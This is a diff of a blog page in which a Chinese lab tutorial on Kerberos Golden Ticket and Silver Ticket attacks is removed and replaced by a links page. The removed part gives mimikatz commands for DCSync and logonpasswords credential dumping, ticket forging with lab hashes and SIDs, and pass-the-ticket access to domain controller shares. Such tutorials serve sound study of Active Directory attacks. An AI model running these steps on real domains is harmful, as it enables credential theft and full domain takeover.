@@ -24,7 +24,7 @@
 
   
 
-  <title>黄金票据 &amp;&amp; 白银票据 | WsyKer&#39;s Blog</title>
+  <title>links | WsyKer&#39;s Blog</title>
 
   
 
@@ -98,18 +98,16 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">黄金票据 &amp;&amp; 白银票据</h1>
+          <h1 class="title-wrap">links</h1>
           <h2 class="title-sub-wrap">
             <strong>WsyKer</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-06-24T01:36:32.000Z" itemprop="datePublished">2022-06-24</time>
+            <time  class="article-date" datetime="2022-06-26T14:28:26.000Z" itemprop="datePublished">2022-06-26</time>
           </h2>
           <ul class="wrap-list dark">
   
 </ul>
           <ul class="wrap-list dark">
-  
-    <li><a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">🏷️ 内网安全</a></li>
   
 </ul>
         </div>
@@ -133,131 +131,7 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h2 id="一、GoldenTicket介绍"><a href="#一、GoldenTicket介绍" class="headerlink" title="一、GoldenTicket介绍"></a>一、GoldenTicket介绍</h2><p>黄金票据（GoldenTicket）是在Kerberos认证中的AS-REP阶段，由于返回的TGT认购权证是由krbtgt用户的密码Hash加密的，因此如果我们拥有krbtgt的Hash就可以自己制作一个TGT认购权证，只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限</p>
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/1.png" alt="1"></p>
-<h2 id="二、GoldenTicket利用"><a href="#二、GoldenTicket利用" class="headerlink" title="二、GoldenTicket利用"></a>二、GoldenTicket利用</h2><h3 id="环境介绍："><a href="#环境介绍：" class="headerlink" title="环境介绍："></a>环境介绍：</h3><p>域控：Windows Server 2008 &amp;&amp; 192.168.5.2</p>
-<p>域用户：Windows7 &amp;&amp; 192.168.5.3</p>
-<h3 id="制作条件："><a href="#制作条件：" class="headerlink" title="制作条件："></a>制作条件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域的FQDN</span><br><span class="line">2、域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value]</span><br><span class="line">3、域的KRBTGT账户NTLM密码哈希</span><br><span class="line">4、伪造用户名[可以是任意的，我这儿是bdministrator]</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h3><p>当攻击者掌握了域控制器的权限，或者以某种方式获取了Krbtgt账户密码的哈希，那么就可以在任意一台机器，甚至是本机制作黄金票据了</p>
-<ol>
-<li>常用命令</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">![3](C:\Users\23528\Desktop\img\ticket\3.png)1、获取域名：net time /domain</span><br><span class="line">2、获取域sid：whoami /all</span><br><span class="line">3、查看域管理员：net group &quot;domain admins&quot; /domain</span><br><span class="line">4、查看票据：kerberos::list</span><br><span class="line">5、清空票据：kerberos::purge</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/2.png" alt="2"></p>
-<ol start="2">
-<li>先在Windows Server 2008导出Krbtgt账号Hash</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;lsadump::dcsync /domain:test.local /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/3.png" alt="3"></p>
-<ol start="3">
-<li>得到Krbtgt Hash之后，进入Windows7开始伪造TGT，使用kerberos::golden功能生成金票golden.kiribi</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:bdministrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /ticket:bdministrator.kiribi</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">/admin：伪造的用户名[任意即可]</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/4.png" alt="4"></p>
-<ol start="4">
-<li>通过kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt bdministrator.kiribi</span><br><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/5.png" alt="5"></p>
-<ol start="5">
-<li>此时就可以通过dir成功访问域控的共享文件夹</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\主机名.域名\c$</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/6.png" alt="6"></p>
-<ol start="7">
-<li>在Windows7导出Krbtgt用户Hash</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/7.png" alt="7"></p>
-<h2 id="三、SilverTickets介绍"><a href="#三、SilverTickets介绍" class="headerlink" title="三、SilverTickets介绍"></a>三、SilverTickets介绍</h2><p>白银票据不同于黄金票据，黄金票据发生在KRB_AS_REP认证阶段，是针对用户的，而白银票据（SilverTickets）发生在KRB_AP_REP认证阶段，是针对服务的，GoldenTicket利用Krbtgt Hash来伪造高权限的TGT，从而获取访问任何服务的权限，SilverTickets则是获取某个服务账号的Hash后，伪造服务票据ST，然后通过伪造的TGS，直接发送给Server访问指定的某个服务来进行攻击，此过程无需KDC，其权限低于Golden Ticket</p>
-<h2 id="四、SilverTickets利用"><a href="#四、SilverTickets利用" class="headerlink" title="四、SilverTickets利用"></a>四、SilverTickets利用</h2><h3 id="环境介绍：-1"><a href="#环境介绍：-1" class="headerlink" title="环境介绍："></a>环境介绍：</h3><p>域控：Windows Server 2008 &amp;&amp; 192.168.52.138</p>
-<p>域用户：Windows7 &amp;&amp; 192.168.52.143</p>
-<h3 id="制作条件：-1"><a href="#制作条件：-1" class="headerlink" title="制作条件："></a>制作条件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域名称</span><br><span class="line">2、域的SID值</span><br><span class="line">3、域的服务账户密码HASH</span><br><span class="line">4、需要伪造的用户名</span><br></pre></td></tr></table></figure>
-
-<h3 id="伪造-CIFS-服务权限："><a href="#伪造-CIFS-服务权限：" class="headerlink" title="伪造 CIFS 服务权限："></a>伪造 CIFS 服务权限：</h3><p>CIFS 服务主要用于windows主机之间来进行网络文件共享</p>
-<ol>
-<li>首先在Windows Server 2008使用获取服务账户的USERNAME、域SID、NTLM 哈希</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/8.png" alt="8"></p>
-<ol start="2">
-<li>获取以上信息之后，在Windows7伪造Silver Ticket票据</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /rc4:05df2fd1109e3d3b60f110965f6af128  /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/9.png" alt="9"></p>
-<ol start="3">
-<li>伪造好后，就可以使用dir、type、at等命令访问共享目录了</li>
-</ol>
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/10.png" alt="10"></p>
-<h3 id="伪造-LDAP-服务权限："><a href="#伪造-LDAP-服务权限：" class="headerlink" title="伪造 LDAP 服务权限："></a>伪造 LDAP 服务权限：</h3><ol>
-<li>在Windows7使用dcsync命令导出krbtgt hash，以此来判断权限</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.local /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/11.png" alt="11"></p>
-<ol start="2">
-<li>使用Windows Server 2008获取服务账号的 NTLM Hash，和上面cifs的一样</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:owa.god.org /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/12.png" alt="12"></p>
-<ol start="3">
-<li>使用Windows7伪造Silver Ticket</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /service:LDAP /rc4:05df2fd1109e3d3b60f110965f6af128 /user:Administrator /ptt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/13.png" alt="13"></p>
-<ol start="4">
-<li>再次尝试导出krbtgt hash</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:owa.god.org /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ticket/14.png" alt="14"></p>
-<h3 id="可伪造的其他服务："><a href="#可伪造的其他服务：" class="headerlink" title="可伪造的其他服务："></a>可伪造的其他服务：</h3><table>
-<thead>
-<tr>
-<th>可伪造名称：</th>
-<th>服务名</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>WMI</td>
-<td>HOST、RPCSS</td>
-</tr>
-<tr>
-<td>Poershell Remoteing</td>
-<td>HOST、HTTP</td>
-</tr>
-<tr>
-<td>WinRM</td>
-<td>HOST、HTTP</td>
-</tr>
-<tr>
-<td>Scheduled Tasks</td>
-<td>HOST</td>
-</tr>
-<tr>
-<td>LDAP、DCSync</td>
-<td>LDAP</td>
-</tr>
-<tr>
-<td>Windows File Share(CIFS)</td>
-<td>CIFS</td>
-</tr>
-<tr>
-<td>Windows Remote ServerAdministration Tools</td>
-<td>RPCSS、LDAP、CIFS</td>
-</tr>
-</tbody></table>
+        <p>{ “name” : “辉哥”, “link” : “<a target="_blank" rel="noopener" href="https://xiaoduan.net.cn/&quot;">https://xiaoduan.net.cn/&quot;</a>, “description” : “”, “avatar” : “” }</p>
 
       </section>
 
@@ -265,28 +139,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2022/06/24/Relay/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">NTLM中继</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2022/06/23/ntds/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">ntds.dit导出</h2>
+        <a href="/2022/06/26/c2hide/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Cobalt Strike的隐藏技术</h2>
         </a>
       
       <div class="card-text--row">Older</div>
